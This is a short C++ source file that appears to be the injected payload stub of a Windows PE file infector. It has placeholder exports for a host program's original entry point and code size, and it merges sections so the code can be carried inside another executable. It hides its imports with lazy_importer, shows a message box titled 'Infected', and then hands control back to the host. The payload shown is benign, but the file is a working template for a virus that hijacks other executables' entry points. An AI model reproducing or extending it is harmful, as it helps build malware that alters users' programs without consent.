#define LAZY_IMPORTER_RESOLVE_FORWARDED_EXPORTS
#define LAZY_IMPORTER_CASE_INSENSITIVE
#include <Windows.h>
#include <lazy_importer.hpp>
#include <Zydis/Zydis.h>
#pragma comment(linker, "/merge:.rdata=.text")
#pragma comment(linker, "/merge:.pdata=.text")
#pragma comment(linker, "/merge:.data=.text")

typedef
void
(_stdcall* EntryPoint_t)(
	void
	);

extern "C"
__declspec(dllexport)
EntryPoint_t ep = reinterpret_cast<EntryPoint_t>(0xCCCCCCCCCCCCCCCC);

extern "C"
__declspec(dllexport)
uint64_t sizeOfCode = 0xCCCCCCCCCCCCCCCC;

extern "C"
__declspec(dllexport)
void
__fastcall
BreakPoint(
	void
);

extern "C"
__declspec(dllexport)
void
__fastcall
main(
	void
)
{
	//BreakPoint();
	LI_FN(LoadLibraryW)(L"USER32.dll");
	LI_FN(MessageBoxA)(nullptr, "Hello world", "Infected", MB_OK);

	/*ZydisDecoder decoder;
	ZydisDecodedInstruction instruction;
	ZyanUSize offset = 0;
	ZydisFormatter formatter;
	ZydisFormatterInit(&formatter, ZYDIS_FORMATTER_STYLE_INTEL);
	ZydisDecoderInit(&decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_ADDRESS_WIDTH_64);
	while (ZYAN_SUCCESS(ZydisDecoderDecodeBuffer(&decoder, (uint8_t*)ep + offset, sizeOfCode - offset, &instruction)))
	{
		if (instruction.opcode == 0xc3 ||
			instruction.opcode == 0xcb ||
			instruction.opcode == 0xc2 ||
			instruction.opcode == 0xca)
			break;
	}*/

	ep();
	return;
}
